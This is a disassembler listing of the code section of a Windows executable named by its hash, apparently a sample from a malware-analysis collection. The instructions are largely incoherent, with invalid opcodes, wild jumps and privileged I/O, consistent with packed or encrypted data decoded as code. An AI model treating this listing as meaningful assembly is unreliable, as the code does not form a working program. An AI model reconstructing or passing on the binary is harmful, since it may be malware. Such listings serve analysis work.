
e2c55d1a33b24f0e8623172cd39fe98527a1565b0ddbbc788328f71ce5d28c5a.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	arpl   bx,sp
  411002:	xchg   ecx,eax
  411003:	mov    edx,0x13638517
  411008:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411009:	and    bl,dh
  41100b:	std    
  41100c:	xchg   ecx,eax
  41100d:	jecxz  0x410faa
  41100f:	iret   
  411010:	test   DWORD PTR [edx-0x6ab6353e],ebp
  411016:	jb     0x410fba
  411018:	inc    esp
  411019:	mov    ds:0x4c81db94,al
  41101e:	jg     0x411090
  411020:	sub    al,0x5
  411022:	inc    esp
  411023:	ficom  WORD PTR [eax]
  411025:	je     0x411050
  411027:	fstp   QWORD PTR [ecx]
  411029:	rol    ecx,1
  41102b:	into   
  41102c:	push   ss
  41102d:	dec    ebx
  41102e:	xor    al,0x83
  411030:	xchg   DWORD PTR ds:0xe26e6503,ebx
  411036:	mov    ecx,0xfa64271f
  41103b:	mov    eax,0x2eb276de
  411040:	pop    esp
  411041:	pop    ebp
  411042:	mov    fs,WORD PTR [ebp-0x2d072928]
  411048:	jmp    0xba04:0xda68fe66
  41104f:	adc    cl,BYTE PTR [esi+edx*1-0x21]
  411053:	sbb    eax,0x34f3f1b1
  411058:	cmp    ecx,eax
  41105a:	imul   edx,DWORD PTR [eax-0x1073b91f],0x2f
  411061:	fcomp  DWORD PTR [eax+0x40b71091]
  411067:	xchg   BYTE PTR [ecx],bl
  411069:	call   0x72fa9639
  41106e:	daa    
  41106f:	and    DWORD PTR [esi],eax
  411071:	mov    dl,0x52
  411073:	inc    ebx
  411074:	popa   
  411075:	cmp    BYTE PTR [ebp+0x5d64c118],0xb7
  41107c:	pop    edx
  41107d:	dec    esi
  41107e:	(bad)  
  41107f:	push   0x4c4f95e1
  411084:	je     0x411035
  411086:	xlat   BYTE PTR ds:[ebx]
  411087:	pop    ebx
  411088:	nop
  411089:	inc    edi
  41108a:	out    dx,al
  41108b:	pop    esi
  41108c:	pusha  
  41108d:	push   cs
  41108e:	rcl    BYTE PTR [esi-0x6b],0xb5
  411092:	fidivr WORD PTR [eax+0x66597302]
  411098:	mov    ds:0x353f0e2c,al
  41109d:	imul   ebx,DWORD PTR [eax],0x7f85741d
  4110a3:	mov    BYTE PTR [eax-0x42],dh
  4110a6:	pop    ecx
  4110a7:	pop    ds
  4110a8:	repnz pop ds
  4110aa:	and    al,0xaf
  4110ac:	pushf  
  4110ad:	into   
  4110ae:	(bad)  
  4110af:	adc    edx,ebp
  4110b1:	or     esp,esp
  4110b3:	aad    0x54
  4110b5:	mov    ds:0xc135c3bf,al
  4110ba:	int    0x4a
  4110bc:	sbb    bh,BYTE PTR [ebp-0x54bfbde9]
  4110c2:	pop    edi
  4110c3:	icebp  
  4110c4:	sub    bh,BYTE PTR [edi+0x62]
  4110c7:	xchg   ebx,eax
  4110c8:	out    dx,eax
  4110c9:	jo     0x4110b1
  4110cb:	push   ebx
  4110cc:	test   dh,cl
  4110ce:	or     DWORD PTR [edx+ebx*2],esi
  4110d1:	fnstcw WORD PTR [ebp-0xacaaf48]
  4110d7:	push   edx
  4110d8:	aaa    
  4110d9:	dec    ebp
  4110da:	(bad)  
  4110db:	std    
  4110dc:	add    DWORD PTR [ecx+ebx*2],ecx
  4110df:	add    DWORD PTR [esi-0x3ba58370],esi
  4110e5:	pop    edx
  4110e6:	lods   al,BYTE PTR ds:[esi]
  4110e7:	pop    edx
  4110e8:	jae    0x411150
  4110ea:	mov    bl,0x78
  4110ec:	xchg   esi,edx
  4110ee:	xor    dl,BYTE PTR [edi+ebx*1+0x4f9bab1a]
  4110f5:	cmp    DWORD PTR [edi-0x6d],esp
  4110f8:	xor    al,0x3e
  4110fa:	mov    al,ds:0x64042e64
  4110ff:	outs   dx,BYTE PTR ds:[esi]
  411100:	sbb    DWORD PTR [ecx-0x69a28063],ebp
  411106:	daa    
  411107:	push   ecx
  411108:	jle    0x4110cd
  41110a:	fnstsw WORD PTR [bp+di-0x4c]
  41110e:	and    eax,edi
  411110:	enter  0x7b67,0xf7
  411114:	repnz popf 
  411116:	jecxz  0x411104
  411118:	push   es
  411119:	fist   DWORD PTR ds:[edi+eax*4+0x7]
  41111e:	xor    ah,ah
  411120:	pop    es
  411121:	add    al,0x7f
  411123:	pusha  
  411124:	out    0xc4,al
  411126:	sti    
  411127:	pusha  
  411128:	ror    BYTE PTR ds:0x1a905319,cl
  41112e:	paddsb mm4,QWORD PTR [eax]
  411131:	cmp    esp,0x64
  411134:	pop    es
  411135:	adc    esp,DWORD PTR [edi]
  411137:	scas   eax,DWORD PTR es:[edi]
  411138:	loop   0x41119c
  41113a:	jne    0x411110
  41113c:	(bad)  
  41113d:	mov    ecx,0xb17ec545
  411142:	xor    BYTE PTR [ebp-0x5600a744],dl
  411148:	mov    esi,ss
  41114a:	xchg   DWORD PTR [edx],ebp
  41114c:	addr16 dec edx
  41114e:	fadd   DWORD PTR [edi+0x59bd63bb]
  411154:	ds das 
  411156:	mov    fs,WORD PTR [ecx+0x26928bff]
  41115c:	cmp    cl,BYTE PTR [ebx]
  41115e:	pop    ebp
  41115f:	push   es
  411160:	xchg   esp,eax
  411161:	dec    ecx
  411162:	bound  ecx,QWORD PTR [edx-0x4b]
  411165:	sub    BYTE PTR [edi+0x5603a150],cl
  41116b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41116c:	xchg   esi,eax
  41116d:	popf   
  41116e:	add    al,0x24
  411170:	mov    DWORD PTR [edx+0x6d],esp
  411173:	xor    ah,al
  411175:	das    
  411176:	(bad)  
  411177:	cmc    
  411178:	fwait
  411179:	aas    
  41117a:	xor    al,0x97
  41117c:	xchg   ebx,eax
  41117d:	add    BYTE PTR [eax+0x665381e2],ch
  411183:	mov    ecx,0x90611437
  411188:	in     eax,0x9c
  41118a:	lds    esp,FWORD PTR [ebx+0x65]
  41118d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41118e:	sbb    dh,cl
  411190:	push   ds
  411191:	mov    ebx,0x4d844110
  411196:	and    eax,0x7c6ce5df
  41119b:	out    0x92,al
  41119d:	fisttp QWORD PTR [ecx+0x60]
  4111a0:	or     eax,0x5fe9a423
  4111a5:	dec    eax
  4111a6:	outs   dx,BYTE PTR ds:[esi]
  4111a7:	neg    BYTE PTR [eax]
  4111a9:	loopne 0x4111ea
  4111ab:	repnz inc edi
  4111ad:	inc    esp
  4111ae:	jae    0x41116b
  4111b0:	sub    DWORD PTR [esi-0x4f],ebp
  4111b3:	or     DWORD PTR [esi+0x1e4749b9],edi
  4111b9:	test   BYTE PTR [ecx+0x2f56930f],0x5b
  4111c0:	ins    DWORD PTR es:[edi],dx
  4111c1:	fld    DWORD PTR [esp+ebx*8+0x3fd25ca4]
  4111c8:	sbb    ebx,esp
  4111ca:	xor    DWORD PTR [edx+0x66],edx
  4111cd:	jmp    0x9dcd:0x335c9049
  4111d4:	fist   WORD PTR fs:[edx-0x7190f0ee]
  4111db:	out    dx,al
  4111dc:	sub    esi,DWORD PTR [edx-0x6ca91bf1]
  4111e2:	aad    0x19
  4111e4:	pop    esi
  4111e5:	jecxz  0x411210
  4111e7:	(bad)  
  4111e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111e9:	rcpps  xmm0,xmm1
  4111ec:	xchg   BYTE PTR [esi-0x55],dh
  4111ef:	or     DWORD PTR [esi-0x43],ebx
  4111f2:	aam    0xe1
  4111f4:	mov    ebp,0x8fa54df
  4111f9:	imul   ebp,edi,0xa74eefd4
  4111ff:	fild   WORD PTR ds:0x1b80d406
  411205:	mov    edi,0x8cbb57c4
  41120a:	fwait
  41120b:	loop   0x411244
  41120d:	xchg   ebx,eax
  41120e:	pop    edi
  41120f:	dec    esi
  411210:	or     eax,ecx
  411212:	aam    0xaa
  411214:	mov    ds:0x433c3077,al
  411219:	call   0x5f1f:0x63b94f82
  411220:	in     eax,0x81
  411222:	jo     0x411270
  411224:	fs mov edx,0xb5ffc447
  41122a:	and    al,0xbc
  41122c:	dec    ecx
  41122d:	es mov cl,bl
  411230:	or     eax,0xd10cdcf8
  411235:	out    0xf2,eax
  411237:	sbb    cl,BYTE PTR [eax]
  411239:	xor    edx,DWORD PTR [ecx-0x3a9f7ef]
  41123f:	(bad)  
  411240:	jle    0x41122c
  411242:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411243:	sub    esp,DWORD PTR [ebx+0x6d]
  411246:	inc    esi
  411247:	repz dec ebp
  411249:	mov    esp,0x4735f4b
  41124e:	dec    ebp
  41124f:	xchg   edi,eax
  411250:	mov    eax,0x11f73ae8
  411255:	test   eax,0xd2b57bb4
  41125a:	data16 cli 
  41125c:	add    BYTE PTR [ecx],dl
  41125e:	loop   0x4111fe
  411260:	inc    ebp
  411261:	arpl   WORD PTR [ebx],si
  411263:	sub    al,0xc4
  411265:	fwait
  411266:	inc    ebx
  411267:	dec    edi
  411268:	adc    BYTE PTR [ecx-0x77a05819],cl
  41126e:	push   0x57491ed1
  411273:	out    dx,eax
  411274:	dec    edx
  411275:	in     al,0xc8
  411277:	mov    ebx,eax
  411279:	pop    edi
  41127a:	jnp    0x41123f
  41127c:	xor    al,bl
  41127e:	out    dx,al
  41127f:	stos   BYTE PTR es:[edi],al
  411280:	xor    ch,BYTE PTR gs:[ecx+0x77080669]
  411287:	add    BYTE PTR [esi-0x66],bl
  41128a:	or     bl,al
  41128c:	push   edx
  41128d:	dec    BYTE PTR [esi]
  41128f:	or     cl,bl
  411291:	mov    bl,0x7b
  411293:	mov    ds:0x590dfc5c,eax
  411298:	pop    ecx
  411299:	(bad)  
  41129a:	mov    bh,0x61
  41129c:	or     al,0x7e
  41129e:	dec    ebp
  41129f:	(bad)  
  4112a1:	aas    
  4112a2:	sub    al,0x90
  4112a4:	mov    eax,ds:0xf09c2fb5
  4112a9:	jae    0x411275
  4112ab:	push   edx
  4112ac:	jns    0x411296
  4112ae:	dec    ebx
  4112af:	mov    bl,0xd0
  4112b1:	inc    ecx
  4112b2:	mov    esp,esi
  4112b4:	fs mov bh,0xaa
  4112b7:	aaa    
  4112b8:	and    al,0x76
  4112ba:	add    ah,al
  4112bc:	or     bh,BYTE PTR [ebx]
  4112be:	bound  ecx,QWORD PTR [esi-0x45]
  4112c1:	stc    
  4112c2:	xchg   esi,eax
  4112c3:	jbe    0x41127a
  4112c5:	and    bh,BYTE PTR [edx+0x78946248]
  4112cb:	push   ebp
  4112cc:	xchg   ecx,eax
  4112cd:	or     BYTE PTR ds:0xe148fe65,dh
  4112d3:	pop    ebx
  4112d4:	jne    0x411306
  4112d6:	push   0x85a1b068
  4112db:	imul   ebx,DWORD PTR [esi-0x6],0x8793a544
  4112e2:	mov    ds:0xf167fe22,eax
  4112e7:	nop
  4112e8:	push   edi
  4112e9:	daa    
  4112ea:	jl     0x4112aa
  4112ec:	inc    ecx
  4112ed:	ror    DWORD PTR [ebp+0x7502cb42],1
  4112f3:	dec    edx
  4112f4:	aam    0x2a
  4112f6:	jns    0x411362
  4112f8:	adc    ah,BYTE PTR [edx+0x6c]
  4112fb:	(bad)  
  4112fc:	stc    
  4112fd:	mov    DWORD PTR [eax],ecx
  4112ff:	or     eax,0x2f474b28
  411304:	iret   
  411305:	addr16 (bad) 
  411307:	loop   0x41131a
  411309:	xor    eax,0xfa789123
  41130e:	lahf   
  41130f:	enter  0x2f7b,0xa3
  411313:	shr    ebp,cl
  411315:	bound  bp,DWORD PTR [ecx-0x53]
  411319:	sub    al,0x90
  41131b:	xor    bh,ah
  41131d:	add    ch,BYTE PTR [ebp+0xc78720a]
  411323:	(bad)  
  411325:	mov    ds:0x6ffd5361,al
  41132a:	movhps xmm7,QWORD PTR [ebp-0x77]
  41132e:	(bad)  
  41132f:	cmp    BYTE PTR [edi+0x64c05cc1],ah
  411335:	pop    edx
  411336:	add    ah,dh
  411338:	sub    al,BYTE PTR [edx-0x3]
  41133b:	mov    bh,0xe6
  41133d:	sbb    eax,0xf8fb7a29
  411342:	push   edi
  411343:	int3   
  411344:	lahf   
  411345:	mov    edi,0x1b3984c7
  41134a:	lds    edx,FWORD PTR [edi]
  41134c:	xchg   ecx,eax
  41134d:	lea    edi,[ebx]
  41134f:	push   cs
  411350:	sbb    cl,BYTE PTR [eax-0x32795cf1]
  411356:	xchg   ebx,eax
  411357:	mov    ebx,0xa1b58325
  41135c:	adc    al,0x7b
  41135e:	jle    0x4113c3
  411360:	pop    ss
  411361:	adc    ebp,DWORD PTR [eax-0x4a]
  411364:	pop    ss
  411365:	fcmovb st,st(6)
  411367:	mov    BYTE PTR [ecx-0x4f1d7ea1],ch
  41136d:	test   eax,0x2b8d247e
  411372:	(bad)  
  411374:	push   eax
  411375:	in     eax,0x95
  411377:	fimul  WORD PTR [eax]
  411379:	inc    ebx
  41137a:	and    ebx,DWORD PTR [esi-0x32]
  41137d:	jbe    0x411384
  41137f:	in     al,0x3b
  411381:	push   eax
  411382:	and    al,0xf
  411384:	xor    eax,DWORD PTR [esi+ebp*4]
  411387:	xor    al,0xee
  411389:	sar    WORD PTR [eax+edx*2],0x4
  41138e:	jmp    0xf721cd44
  411393:	mov    al,ds:0x79cc6b3
  411398:	test   DWORD PTR [edi+edi*1+0x36],0x29bab536
  4113a0:	dec    ebx
  4113a1:	or     cl,bl
  4113a3:	cmp    al,0xc9
  4113a5:	inc    ebx
  4113a6:	push   eax
  4113a7:	leave  
  4113a8:	and    eax,0x31394e3c
  4113ad:	jne    0x411399
  4113af:	adc    ebx,esp
  4113b1:	aas    
  4113b2:	sub    BYTE PTR [ecx+ebx*1-0x17],ah
  4113b6:	sub    DWORD PTR [esi],eax
  4113b8:	cwde   
  4113b9:	mov    eax,ds:0x4a4a921e
  4113be:	fild   QWORD PTR [edi]
  4113c0:	fld    QWORD PTR [edi+0x3ea4dde8]
  4113c6:	xchg   BYTE PTR [edi],bl
  4113c8:	and    al,0xc3
  4113ca:	xchg   edi,eax
  4113cb:	popa   
  4113cc:	sub    al,0x97
  4113ce:	addr16 (bad) 
  4113d0:	int    0x9a
  4113d2:	mov    esp,0xd0237b13
  4113d7:	cmp    eax,0x981accb3
  4113dc:	add    esp,DWORD PTR [ebp-0x5aed155d]
  4113e2:	in     eax,0x62
  4113e4:	xchg   ecx,eax
  4113e5:	adc    eax,0x2b782937
  4113ea:	leave  
  4113eb:	push   eax
  4113ec:	hlt    
  4113ed:	mov    ch,0x9c
  4113ef:	mov    dl,0x79
  4113f1:	mov    esi,DWORD PTR [ebx]
  4113f3:	jmp    0xd3bb8fc
  4113f8:	and    bh,BYTE PTR [edi-0x49]
  4113fb:	xchg   BYTE PTR [esi+ebx*1-0x4f],bl
  4113ff:	sbb    dh,BYTE PTR [ebp+0x42]
  411402:	repz adc edi,DWORD PTR [di]
  411406:	mov    edi,0xf9c1ceb5
  41140b:	dec    eax
  41140c:	into   
  41140d:	sub    DWORD PTR [ebx+0x7ce64eea],edi
  411413:	jnp    0x41143d
  411415:	dec    esi
  411416:	jne    0x8a59e3b0
  41141c:	ror    BYTE PTR [ebx],1
  41141e:	retf   
  41141f:	push   es
  411420:	shl    BYTE PTR [edx-0x12],1
  411423:	add    DWORD PTR [eax-0x46],0xfffffff1
  411427:	jns    0x4113c0
  411429:	ds jae 0x41142f
  41142c:	cs dec edi
  41142e:	mov    ds:0xa4e699a2,eax
  411433:	arpl   WORD PTR ds:0x324a6b43,ax
  411439:	and    eax,0xa2e3fbba
  41143e:	rol    BYTE PTR [ecx+0x57],1
  411441:	mov    ebp,0xc9292b82
  411446:	jnp    0x4114be
  411448:	jmp    0x411445
  41144a:	sti    
  41144b:	ror    BYTE PTR [eax+0x20],1
  41144e:	mov    al,BYTE PTR [edi+0x5517ee27]
  411454:	mov    ds:0x2d235a19,eax
  411459:	pop    ebp
  41145a:	and    dl,dl
  41145c:	arpl   cx,bp
  41145e:	ret    0xb1cb
  411461:	push   cs
  411462:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411463:	jmp    0xc39a:0xca80359d
  41146a:	add    ch,cl
  41146c:	and    BYTE PTR gs:[edx+edx*1+0x61],ah
  411471:	pop    esp
  411472:	jno    0x411436
  411474:	cwde   
  411475:	sbb    al,0xe5
  411477:	push   ebp
  411478:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411479:	fwait
  41147a:	or     eax,0xbec34227
  41147f:	stc    
  411480:	inc    ecx
  411481:	ror    BYTE PTR [esi-0x13],cl
  411484:	xchg   ebp,eax
  411485:	loope  0x4114c0
  411487:	sbb    bh,BYTE PTR [esi-0x30]
  41148a:	xchg   BYTE PTR [ecx-0x37],al
  41148d:	imul   ebx,DWORD PTR [ebx],0x335f8bac
  411493:	push   eax
  411494:	mov    ah,BYTE PTR [eax]
  411496:	mov    dh,0xbd
  411498:	pop    es
  411499:	fistp  DWORD PTR [ecx-0x211372f1]
  41149f:	sbb    DWORD PTR [edi],eax
  4114a1:	pop    edx
  4114a2:	add    edi,ebx
  4114a4:	daa    
  4114a5:	repz sub DWORD PTR [esi-0x45],ebx
  4114a9:	lods   al,BYTE PTR ds:[esi]
  4114aa:	or     eax,0xb50ab1c7
  4114af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114b0:	xchg   ecx,eax
  4114b1:	leave  
  4114b2:	jnp    0x4114c6
  4114b4:	inc    ebx
  4114b5:	and    ch,dh
  4114b7:	or     DWORD PTR [ecx-0x2c64e418],ebp
  4114bd:	mov    ebx,0xb54ad1b0
  4114c2:	push   ebp
  4114c3:	(bad)  
  4114c4:	(bad)  
  4114c5:	in     eax,dx
  4114c6:	outs   dx,BYTE PTR ds:[esi]
  4114c7:	push   ds
  4114c8:	mov    eax,0xf63b926
  4114cd:	fldenv [esi]
  4114cf:	mov    bh,0x1d
  4114d1:	call   0x945f4c29
  4114d6:	popf   
  4114d7:	xor    BYTE PTR [eax],0x4c
  4114da:	push   eax
  4114db:	in     al,dx
  4114dc:	cli    
  4114dd:	ds xchg ebx,eax
  4114df:	inc    esi
  4114e0:	push   0xffffffdb
  4114e2:	jne    0x41149d
  4114e4:	lods   al,BYTE PTR ds:[esi]
  4114e5:	lods   al,BYTE PTR ds:[esi]
  4114e6:	push   ebx
  4114e7:	mov    dh,0xf9
  4114e9:	jnp    0x4114c3
  4114eb:	sub    ecx,DWORD PTR [eax+0x75b9393]
  4114f1:	ins    BYTE PTR es:[edi],dx
  4114f2:	stos   DWORD PTR es:[edi],eax
  4114f3:	xchg   ebx,eax
  4114f4:	adc    al,0x25
  4114f6:	cmp    eax,DWORD PTR [esi+0xa051da8]
  4114fc:	sub    bh,BYTE PTR [esi-0x7d]
  4114ff:	lahf   
  411500:	push   edx
  411501:	cmp    eax,DWORD PTR [ebp-0x4]
  411504:	out    0x50,eax
  411506:	scas   eax,DWORD PTR es:[edi]
  411507:	push   0xdbf2a531
  41150c:	sti    
  41150d:	inc    esi
  41150e:	mov    ecx,DWORD PTR [ecx-0x24773e68]
  411514:	inc    edx
  411515:	div    BYTE PTR [esi]
  411517:	or     edi,DWORD PTR [esi]
  411519:	repnz cmc 
  41151b:	add    DWORD PTR [ebx],esi
  41151d:	xor    DWORD PTR [eax+0x33c7ff10],esi
  411523:	loopne 0x4114b4
  411525:	inc    esi
  411526:	cld    
  411527:	shl    DWORD PTR [esi-0x4ab00610],cl
  41152d:	push   edx
  41152e:	fldenv [edx+ecx*2]
  411531:	inc    esi
  411532:	jo     0x411584
  411534:	cli    
  411535:	lods   eax,DWORD PTR ds:[esi]
  411537:	xchg   edx,eax
  411538:	shl    BYTE PTR [esi-0x7bd22af1],1
  41153e:	retf   
  41153f:	pusha  
  411540:	or     esi,DWORD PTR [ebp-0x1b]
  411543:	fstp   QWORD PTR [ecx+ecx*2-0x76]
  411547:	cmp    DWORD PTR [ebx],esp
  411549:	dec    ecx
  41154a:	inc    esi
  41154b:	jne    0x411582
  41154d:	lahf   
  41154e:	push   0xffffff9b
  411550:	mov    dl,0xa2
  411552:	jbe    0x4115c3
  411554:	inc    ecx
  411555:	push   es
  411556:	sqrtps xmm1,xmm7
  411559:	dec    edi
  41155a:	add    DWORD PTR [edx],ebx
  41155c:	jmp    0xa1df1287
  411561:	icebp  
  411562:	leave  
  411563:	mov    esp,0xd2e7fb2a
  411568:	push   edx
  411569:	jle    0x411542
  41156b:	rcl    BYTE PTR [eax],0xfd
  41156e:	not    ecx
  411570:	pop    ds
  411571:	xchg   ebx,esp
  411573:	dec    esp
  411574:	push   ss
  411575:	call   0x77eb:0xe0fc0663
  41157c:	xchg   edx,eax
  41157d:	mov    esp,0x66386516
  411582:	mov    ds:0xf0bbd4e1,eax
  411587:	mov    bh,0x54
  411589:	loopne 0x4115cb
  41158b:	(bad)  
  41158c:	cli    
  41158d:	push   ecx
  41158e:	retf   
  41158f:	pop    esp
  411590:	imul   edi,eax,0x682e2739
  411596:	jo     0x41153e
  411598:	jmp    0xd6a3:0xc95b504e
  41159f:	and    eax,0x1929dc8b
  4115a4:	sbb    al,0x50
  4115a6:	sbb    eax,0x42ea984e
  4115ab:	mov    al,ds:0x19ff244c
  4115b0:	into   
  4115b1:	or     al,0x8e
  4115b3:	sahf   
  4115b4:	and    dl,BYTE PTR [edi]
  4115b6:	or     BYTE PTR [ebx],dh
  4115b8:	in     eax,dx
  4115b9:	jnp    0x411639
  4115bb:	arpl   WORD PTR ds:0x38aaa182,cx
  4115c1:	pusha  
  4115c2:	mov    eax,0x4ce844de
  4115c7:	(bad)
  4115ca:	jbe    0x4115cc
  4115cc:	xchg   al,dl
  4115ce:	mov    dl,0x33
  4115d0:	and    eax,0xfa43103c
  4115d5:	adc    eax,0x143dfbe9
  4115da:	mov    edx,0x39a22c0d
  4115df:	dec    bx
  4115e1:	or     ebx,ecx
  4115e3:	and    bl,ah
  4115e5:	push   ss
  4115e6:	xchg   esp,eax
  4115e7:	pop    esi
  4115e8:	ret    
  4115e9:	ds test edx,esi
  4115ec:	pushf  
  4115ed:	dec    edx
  4115ee:	jmp    DWORD PTR [edi+0x6f045cfa]
  4115f4:	rol    DWORD PTR [edx+eiz*2+0x60],1
  4115f8:	pop    eax
  4115f9:	cli    
  4115fa:	lea    ebx,[ebp+0x2a]
  4115fd:	adc    al,0x30
  4115ff:	inc    ecx
  411600:	sbb    DWORD PTR [ebp-0xfebcae],0xffffffbf
  411607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411608:	pop    ebx
  411609:	mov    ds:0x81397edb,eax
  41160e:	js     0x411609
  411610:	xchg   dl,al
  411612:	mov    ecx,0xcba81a75
  411617:	mov    ebx,0x7d4d9b6c
  41161c:	lds    edi,FWORD PTR ds:0x5c9dc2fb
  411622:	scas   al,BYTE PTR es:[edi]
  411623:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411624:	inc    ecx
  411625:	pop    ds
  411626:	dec    eax
  411627:	fld    TBYTE PTR [ecx-0x52]
  41162a:	aaa    
  41162b:	push   es
  41162c:	ins    DWORD PTR es:[edi],dx
  41162d:	ror    DWORD PTR [esi+0x572a1902],1
  411633:	(bad)  
  411635:	sbb    al,BYTE PTR [esi-0xe]
  411638:	sbb    ecx,DWORD PTR [ecx+0x54]
  41163b:	sbb    eax,0x264b560c
  411640:	sub    edx,DWORD PTR [eax-0x704db92b]
  411646:	cmp    dl,BYTE PTR [esp+edi*4-0x6e]
  41164a:	xchg   ecx,eax
  41164b:	mov    bh,0x6a
  41164d:	xor    eax,0xb22c7def
  411652:	adc    edx,DWORD PTR [edi]
  411654:	inc    edi
  411655:	pop    edi
  411656:	repnz inc esp
  411658:	inc    ebp
  411659:	imul   ecx,DWORD PTR [ebx],0xe2e2fb47
  41165f:	lods   eax,DWORD PTR ds:[esi]
  411660:	(bad)
  411663:	ja     0x4116ae
  411665:	lock jg 0x41164f
  411668:	gs push ebx
  41166a:	ds out 0x28,eax
  41166d:	hlt    
  41166e:	aad    0x24
  411670:	xchg   BYTE PTR [esi-0x3fc34aa1],cl
  411676:	es dec esi
  411678:	cld    
  411679:	jg     0x4116e7
  41167b:	jbe    0x41168c
  41167d:	mov    bh,0x23
  41167f:	xchg   ah,al
  411681:	jle    0x41160b
  411683:	jecxz  0x41166a
  411685:	test   DWORD PTR [ecx],ebp
  411687:	pop    ss
  411688:	shr    bh,1
  41168a:	push   ebx
  41168b:	jns    0x4116dc
  41168d:	call   0x9d52:0x51b51ae7
  411694:	jl     0x4116fa
  411696:	xchg   ecx,eax
  411697:	jo     0x4116dc
  411699:	and    al,0xdc
  41169b:	sbb    DWORD PTR [ecx+0x4d030705],esp
  4116a1:	ins    DWORD PTR es:[edi],dx
  4116a2:	jae    0x4116ef
  4116a4:	xchg   ecx,eax
  4116a5:	inc    eax
  4116a6:	add    bh,0x63
  4116a9:	push   cs
  4116aa:	jb     0x4116ff
  4116ac:	out    dx,al
  4116ad:	test   al,0xa8
  4116af:	icebp  
  4116b0:	jno    0x41163b
  4116b2:	xor    ch,BYTE PTR [ebx+0x3c8565a]
  4116b8:	jge    0x41167c
  4116ba:	rcr    BYTE PTR [ebx-0x63],1
  4116bd:	addr16 sbb eax,0xd8e2b32
  4116c3:	sub    al,BYTE PTR [esi-0x44]
  4116c6:	xor    bl,BYTE PTR [esi+edi*4]
  4116c9:	and    BYTE PTR [ecx-0x2f],ch
  4116cc:	jns    0x411707
  4116ce:	cmp    BYTE PTR [esi-0x4f],bh
  4116d1:	xchg   DWORD PTR [ebx+0x7d],esi
  4116d4:	aas    
  4116d5:	or     ecx,ecx
  4116d7:	dec    eax
  4116d8:	ret    0x980c
  4116db:	dec    edx
  4116dc:	dec    edi
  4116dd:	aam    0xd6
  4116df:	out    dx,eax
  4116e0:	add    al,0xcf
  4116e2:	aas    
  4116e3:	or     BYTE PTR [ecx-0x6577ec8a],ch
  4116e9:	or     esp,eax
  4116eb:	xor    ecx,DWORD PTR [esp+ebx*2]
  4116ee:	push   cs
  4116ef:	in     eax,dx
  4116f0:	int3   
  4116f1:	mov    eax,0xd6fa6556
  4116f6:	sub    ecx,esp
  4116f8:	inc    edx
  4116f9:	xchg   ecx,eax
  4116fa:	adc    edx,ecx
  4116fc:	mov    bh,0x5f
  4116fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116ff:	hlt    
  411700:	jo     0x41168e
  411702:	push   edx
  411703:	mov    edi,0x4376c370
  411708:	std    
  411709:	cmp    bh,cl
  41170b:	rcr    BYTE PTR [eax+0xe],0xed
  41170f:	jmp    0x60871b98
  411714:	fidivr DWORD PTR [esi-0xd]
  411717:	and    bh,BYTE PTR [esi+0x1b78c46d]
  41171d:	outs   dx,BYTE PTR ds:[esi]
  41171e:	xor    al,0xa9
  411720:	inc    esp
  411721:	mov    eax,ds:0x1753cfa6
  411726:	and    al,0xbf
  411728:	adc    eax,0x5f8b2d26
  41172d:	sub    DWORD PTR [eax+esi*4-0x1e],eax
  411731:	fwait
  411732:	dec    esp
  411733:	stos   BYTE PTR es:[edi],al
  411734:	sub    BYTE PTR [ecx+edx*1],ch
  411737:	cmp    bl,bh
  411739:	or     eax,0x7a442c8e
  41173e:	push   es
  41173f:	add    esp,DWORD PTR [ecx+0x35]
  411742:	xor    BYTE PTR [edx-0x78],al
  411745:	push   ds
  411746:	jne    0x411720
  411748:	(bad)  
  411749:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41174a:	and    ebp,DWORD PTR [edx-0x20]
  41174d:	ret    
  41174e:	pushf  
  41174f:	rcl    BYTE PTR [ebp-0x4ea85dc9],0x7a
  411756:	jp     0x4116f8
  411758:	dec    edi
  411759:	outs   dx,BYTE PTR ds:[esi]
  41175a:	and    eax,0xffffff87
  41175d:	jnp    0x4117d0
  41175f:	xchg   esi,eax
  411760:	ins    BYTE PTR es:[edi],dx
  411761:	mov    esi,0xba45f744
  411766:	mov    esi,0xf9121154
  41176b:	in     eax,0xbf
  41176d:	call   0x65e92a79
  411772:	sbb    al,0x8c
  411774:	jp     0x4117d9
  411776:	jbe    0x4116fb
  411778:	inc    edi
  411779:	push   esp
  41177a:	cmp    al,0x84
  41177c:	stos   DWORD PTR es:[edi],eax
  41177d:	cmp    ebx,DWORD PTR [esi-0x490f80ae]
  411783:	imul   BYTE PTR [edx]
  411785:	popa   
  411786:	sub    BYTE PTR [edi-0x1e],bl
  411789:	pop    eax
  41178a:	xchg   esi,eax
  41178b:	aaa    
  41178c:	jmp    0x4c42:0xe1a493c1
  411793:	mov    cl,al
  411795:	(bad)  
  411796:	push   es
  411797:	pop    eax
  411798:	inc    ebp
  411799:	sar    DWORD PTR [ebx-0x3a],cl
  41179c:	or     eax,0xd6beae2d
  4117a1:	adc    esi,ecx
  4117a3:	dec    edx
  4117a4:	test   DWORD PTR [edx-0x25],esp
  4117a7:	and    ah,dh
  4117a9:	popa   
  4117aa:	or     al,0xbd
  4117ac:	aas    
  4117ad:	mov    bl,0xfd
  4117af:	xor    eax,0x3e5f404b
  4117b4:	das    
  4117b5:	mov    ecx,0x55da883f
  4117ba:	rol    DWORD PTR [ebx+0x19],1
  4117bd:	push   0x2e0adb8f
  4117c2:	and    DWORD PTR [ebx-0x725d1120],esp
  4117c8:	jns    0x4117b5
  4117ca:	call   0x21e6b735
  4117cf:	jbe    0x411806
  4117d1:	in     eax,0xdc
  4117d3:	hlt    
  4117d4:	mov    dh,0x86
  4117d6:	mov    bl,0xe8
  4117d8:	push   0x36a307ef
  4117dd:	or     DWORD PTR ds:0x2713469d,esi
  4117e3:	mov    cl,0x11
  4117e5:	jg     0x4117ba
  4117e7:	push   edx
